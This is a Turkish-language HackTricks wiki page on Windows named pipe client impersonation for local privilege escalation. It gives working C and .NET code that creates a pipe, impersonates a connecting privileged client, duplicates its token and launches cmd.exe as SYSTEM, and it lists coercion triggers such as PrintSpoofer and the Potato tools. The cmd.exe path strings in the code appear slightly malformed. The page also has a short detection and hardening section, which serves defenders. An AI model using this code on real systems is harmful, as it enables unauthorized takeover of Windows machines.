# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation, bir named-pipe sunucu iş parçacığının kendisine bağlanan bir istemcinin güvenlik bağlamını benimsemesine izin veren yerel bir ayrıcalık yükseltme ilkelidir. Pratikte, SeImpersonatePrivilege ile kod çalıştırabilen bir saldırgan, ayrıcalıklı bir istemciyi (ör. bir SYSTEM servisi) saldırganın kontrolündeki bir pipe'a bağlanmaya zorlayabilir, ImpersonateNamedPipeClient çağrısı yapabilir, ortaya çıkan token'ı bir primary token olarak duplicate edip istemci olarak bir süreç başlatabilir (çoğunlukla NT AUTHORITY\SYSTEM).

Bu sayfa temel tekniğe odaklanır. SYSTEM'i pipe'ınıza zorla bağlayan uçtan uca exploit zincirleri için aşağıda referans verilen Potato familyası sayfalarına bakın.

## TL;DR
- Bir named pipe oluşturun: \\.\pipe\<random> ve bir bağlantı bekleyin.
- Ayrıcalıklı bir bileşeni bağlanmaya zorlayın (spooler/DCOM/EFSRPC/ve benzeri).
- Pipe'tan en az bir mesaj okuyun, sonra ImpersonateNamedPipeClient çağrısı yapın.
- Mevcut iş parçacığından impersonation token'ını açın, DuplicateTokenEx(TokenPrimary) ile çoğaltın ve CreateProcessWithTokenW/CreateProcessAsUser ile SYSTEM süreci elde edin.

## Requirements and key APIs
- Çağıran process/thread tarafından tipik olarak gereken ayrıcalıklar:
- SeImpersonatePrivilege, bağlanan bir istemciyi başarılı şekilde taklit edebilmek ve CreateProcessWithTokenW kullanabilmek için.
- Alternatif olarak, SYSTEM'i taklit ettikten sonra CreateProcessAsUser kullanabilirsiniz; bu SeAssignPrimaryTokenPrivilege ve SeIncreaseQuotaPrivilege gerektirebilir (taklit ettiğinizde bunlar karşılanır).
- Kullanılan temel API'ler:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (impersonation'dan önce en az bir mesaj okunmalı)
- ImpersonateNamedPipeClient ve RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW veya CreateProcessAsUser
- Impersonation seviyesi: yerelde faydalı işlemler yapabilmek için istemcinin SecurityImpersonation'a izin vermesi gerekir (birçok yerel RPC/named-pipe istemcisi için varsayılan). İstemciler, pipe'ı açarken SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ile bunu düşürebilir.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notlar:
- Eğer ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) döndürürse, önce named pipe'dan okuduğunuzdan ve istemcinin impersonation'ı Identification seviyesine kısıtlamadığından emin olun.
- İşlem oluşturmak için uygun bir primary token elde etmek amacıyla DuplicateTokenEx'i SecurityImpersonation ve TokenPrimary ile tercih edin.

## .NET hızlı örnek
.NET'te, NamedPipeServerStream RunAsClient aracılığıyla impersonate edebilir. Impersonate edildikten sonra, thread token'ını duplicate edip bir process oluşturun.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEM'i pipe'inize yönlendirmek için yaygın tetikleyiciler/zorlamalar
Bu teknikler, ayrıcalıklı hizmetleri sizin named pipe'inize bağlanmaya zorlayarak onları impersonate etmenizi sağlar:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Ayrıntılı kullanım ve uyumluluk için bakın:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Eğer sadece bir hizmet tetikleyicisinden SYSTEM spawn etmek için pipe oluşturma ve impersonate etme konusunda tam bir örneğe ihtiyacınız varsa, bakın:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Sorun giderme ve dikkat edilmesi gerekenler
- ImpersonateNamedPipeClient'ı çağırmadan önce pipe'tan en az bir mesaj okumalısınız; aksi halde ERROR_CANNOT_IMPERSONATE (1368) alırsınız.
- İstemci SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ile bağlanırsa, sunucu tam olarak impersonate edemez; token'ın impersonation seviyesini GetTokenInformation(TokenImpersonationLevel) ile kontrol edin.
- CreateProcessWithTokenW çağıranın SeImpersonatePrivilege sahibi olmasını gerektirir. Eğer ERROR_PRIVILEGE_NOT_HELD (1314) ile başarısız olursa, SYSTEM'ı zaten impersonate ettikten sonra CreateProcessAsUser kullanın.
- Pipe'inizin security descriptor'ının hedef hizmetin bağlanmasına izin verdiğinden emin olun; eğer sıkılaştırırsanız, varsayılan olarak \\.\pipe altındaki pipe'lar sunucunun DACL'sine göre erişilebilirdir.

## Tespit ve sertleştirme
- Named pipe oluşturulmasını ve bağlantılarını izleyin. Sysmon Event ID'leri 17 (Pipe Created) ve 18 (Pipe Connected), meşru pipe adlarını temel almak ve token-manipulation olaylarından önceki sıra dışı, rastgele görünen pipe'ları yakalamak için kullanışlıdır.
- Aşağıdaki sıraları arayın: process bir pipe oluşturur, bir SYSTEM hizmeti bağlanır, ardından oluşturan process SYSTEM olarak bir child spawn eder.
- Gereksiz hizmet hesaplarından SeImpersonatePrivilege'i kaldırarak ve yüksek ayrıcalıklı gereksiz hizmet oturum açmalarından kaçınarak maruziyeti azaltın.
- Defansif geliştirme: güvenilmeyen named pipe'lara bağlanırken, sunucuların istemciyi gereksiz yere tam olarak impersonate etmesini önlemek için SECURITY_SQOS_PRESENT ile SECURITY_IDENTIFICATION belirtin.

## Referanslar
- Windows: ImpersonateNamedPipeClient documentation (impersonation gereksinimleri ve davranışı). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
